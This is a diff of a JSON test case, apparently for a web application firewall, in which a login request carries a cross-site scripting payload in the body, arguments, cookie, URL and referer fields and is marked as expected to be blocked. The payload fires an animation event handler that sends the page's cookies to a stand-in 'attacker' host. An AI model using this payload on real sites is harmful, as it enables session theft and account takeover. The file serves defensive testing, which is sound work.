@@ -1,14 +1,14 @@
 {
   "req": [
     {
-      "Type": "ALL",
       "UA": "",
-      "Body": "login=<style>@keyframes slidein {}</style><a style='animation-duration:1s;animation-name:slidein;animation-iteration-count:2' onanimationiteration='let test=document;location=`http://attacker?cookie=${test.cookie}`'></a>&password1=&enter=%D0%9E%D1%82%D0%BF%D1%80%D0%B0%D0%B2%D0%B8%D1%82%D1%8C+%D0%B7%D0%B0%D0%BF%D1%80%D0%BE%D1%81",
-      "ARGS": "login=<style>@keyframes slidein {}</style><a style='animation-duration:1s;animation-name:slidein;animation-iteration-count:2' onanimationiteration='let test=document;location=`http://attacker?cookie=${test.cookie}`'></a>&password1=&enter=%D0%9E%D1%82%D0%BF%D1%80%D0%B0%D0%B2%D0%B8%D1%82%D1%8C+%D0%B7%D0%B0%D0%BF%D1%80%D0%BE%D1%81",
-      "Cookie": "login=<style>@keyframes slidein {}</style><a style='animation-duration:1s;animation-name:slidein;animation-iteration-count:2' onanimationiteration='let test=document;location=`http://attacker?cookie=${test.cookie}`'></a>&password1=&enter=%D0%9E%D1%82%D0%BF%D1%80%D0%B0%D0%B2%D0%B8%D1%82%D1%8C+%D0%B7%D0%B0%D0%BF%D1%80%D0%BE%D1%81",
-      "URL": "login=<style>@keyframes slidein {}</style><a style='animation-duration:1s;animation-name:slidein;animation-iteration-count:2' onanimationiteration='let test=document;location=`http://attacker?cookie=${test.cookie}`'></a>&password1=&enter=%D0%9E%D1%82%D0%BF%D1%80%D0%B0%D0%B2%D0%B8%D1%82%D1%8C+%D0%B7%D0%B0%D0%BF%D1%80%D0%BE%D1%81",
-      "Referer": "login=<style>@keyframes slidein {}</style><a style='animation-duration:1s;animation-name:slidein;animation-iteration-count:2' onanimationiteration='let test=document;location=`http://attacker?cookie=${test.cookie}`'></a>&password1=&enter=%D0%9E%D1%82%D0%BF%D1%80%D0%B0%D0%B2%D0%B8%D1%82%D1%8C+%D0%B7%D0%B0%D0%BF%D1%80%D0%BE%D1%81",
-      "Headers": ""
+      "Body": "login%RND%=<style>@keyframes slidein {}</style><a style='animation-duration:1s;animation-name:slidein;animation-iteration-count:2' onanimationiteration='let test=document;location=`http://attacker?cookie=${test.cookie}`'></a>&password1=&enter=%D0%9E%D1%82%D0%BF%D1%80%D0%B0%D0%B2%D0%B8%D1%82%D1%8C+%D0%B7%D0%B0%D0%BF%D1%80%D0%BE%D1%81",
+      "ARGS": "login%RND%=<style>@keyframes slidein {}</style><a style='animation-duration:1s;animation-name:slidein;animation-iteration-count:2' onanimationiteration='let test=document;location=`http://attacker?cookie=${test.cookie}`'></a>&password1=&enter=%D0%9E%D1%82%D0%BF%D1%80%D0%B0%D0%B2%D0%B8%D1%82%D1%8C+%D0%B7%D0%B0%D0%BF%D1%80%D0%BE%D1%81",
+      "Cookie": "<style>@keyframes slidein {}</style><a style='animation-duration:1s;animation-name:slidein;animation-iteration-count:2' onanimationiteration='let test=document;location=`http://attacker?cookie=${test.cookie}`'></a>&password1=&enter=%D0%9E%D1%82%D0%BF%D1%80%D0%B0%D0%B2%D0%B8%D1%82%D1%8C+%D0%B7%D0%B0%D0%BF%D1%80%D0%BE%D1%81",
+      "URL": "<style>@keyframes slidein {}</style><a style='animation-duration:1s;animation-name:slidein;animation-iteration-count:2' onanimationiteration='let test=document;location=`http://attacker?cookie=${test.cookie}`'></a>&password1=&enter=%D0%9E%D1%82%D0%BF%D1%80%D0%B0%D0%B2%D0%B8%D1%82%D1%8C+%D0%B7%D0%B0%D0%BF%D1%80%D0%BE%D1%81",
+      "Referer": "<style>@keyframes slidein {}</style><a style='animation-duration:1s;animation-name:slidein;animation-iteration-count:2' onanimationiteration='let test=document;location=`http://attacker?cookie=${test.cookie}`'></a>&password1=&enter=%D0%9E%D1%82%D0%BF%D1%80%D0%B0%D0%B2%D0%B8%D1%82%D1%8C+%D0%B7%D0%B0%D0%BF%D1%80%D0%BE%D1%81",
+      "Headers": "",
+      "Blocked": true
     }
   ]
 }
